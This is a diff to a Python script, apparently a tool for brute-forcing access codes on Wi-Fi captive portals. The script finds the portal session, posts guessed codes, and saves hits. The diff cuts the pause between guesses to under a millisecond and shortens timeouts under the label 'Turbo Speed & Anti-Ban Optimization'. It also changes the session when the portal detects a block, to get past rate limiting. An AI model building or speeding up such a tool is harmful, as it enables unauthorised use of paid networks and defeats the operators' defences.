@@ -1,4 +1,4 @@
-# lakaw.py (KAVIN FAST SPEED - Auto-Heal Edition)
+# lakaw.py (KAVIN FAST SPEED - Auto-Heal & Turbo Edition)
 import os
 import time
 import json
@@ -27,12 +27,12 @@ DB_FILE = "lakaw_data.db"
 STATE_FILE = "lakaw_state.json"
 HITS_FILE = "hits.txt"
 
-# ⚡ Speed & Anti-Ban Optimization
-BASE_SLEEP_MIN = 0.002
-BASE_SLEEP_MAX = 0.006
+# ⚡ Turbo Speed & Anti-Ban Optimization
+BASE_SLEEP_MIN = 0.0005
+BASE_SLEEP_MAX = 0.001
 RATE_LIMIT_SLEEP = 30
-NETWORK_RETRY_SLEEP = 1.0
-SESSION_REFRESH_SLEEP = 2.0
+NETWORK_RETRY_SLEEP = 0.2
+SESSION_REFRESH_SLEEP = 1.0
 
 console = Console()
 session = requests.Session()
@@ -118,11 +118,8 @@ def extract_session(value):
         return m.group(1) if m else None
     except Exception: return None
 
-# ========================================================
 # ⚡ Auto-Heal Session: Wi-Fi ချိတ်ထားရင် Portal အလိုအလျောက်ရှာမယ်
-# ========================================================
 def fetch_session(custom_url=""):
-    # Custom URL ရှိရင် အရင်စစ်မယ်
     if custom_url:
         try:
             r = session.get(custom_url, timeout=3, allow_redirects=True, verify=False)
@@ -133,14 +130,13 @@ def fetch_session(custom_url=""):
             return portal_base, "auto_session"
         except Exception: pass
 
-    # မရရင် Wi-Fi Portal ကို အလိုအလျောက် ရှာမယ်
     probes = [
         "http://connectivitycheck.gstatic.com/generate_204",
         "http://captive.apple.com/hotspot-detect.html",
     ]
     for url in probes:
         try:
-            r = session.get(url, timeout=3, allow_redirects=True, verify=False)
+            r = session.get(url, timeout=2, allow_redirects=True, verify=False)
         except Exception:
             continue
         try:
@@ -158,7 +154,7 @@ def fetch_session(custom_url=""):
                 m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                 if m:
                     nxt = urljoin(r.url, m.group(1))
-                    r2 = session.get(nxt, timeout=3, allow_redirects=True, verify=False)
+                    r2 = session.get(nxt, timeout=2, allow_redirects=True, verify=False)
                     sid = extract_session(r2.url) or extract_session(r2.text)
                     if sid: return portal_base, sid
             except Exception: pass
@@ -170,7 +166,7 @@ def test_code(portal_base, session_id, code):
     headers = {"Content-Type": "application/json", "Origin": portal_base}
     payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
     try:
-        r = session.post(url, json=payload, headers=headers, timeout=2.0, verify=False)
+        r = session.post(url, json=payload, headers=headers, timeout=1.0, verify=False)
         return r.text if r.text else "__NETWORK_ERROR__"
     except Exception: return "__NETWORK_ERROR__"
 
@@ -325,7 +321,7 @@ def scan_loop(mode, length, prefix="", custom_url="", scan_method="random", star
                     _update(code, "Limit", current_speed)
                     push_log(f"[bold red]🛡️ Block Detected! Auto-changing Session...[/bold red]")
                     time.sleep(RATE_LIMIT_SLEEP)
-                    session_id = None # IP အသစ်ပြန်ယူဖို့
+                    session_id = None
                     continue
 
                 if ("session timed out" in low or "session timeout" in low or '"session":null' in low):
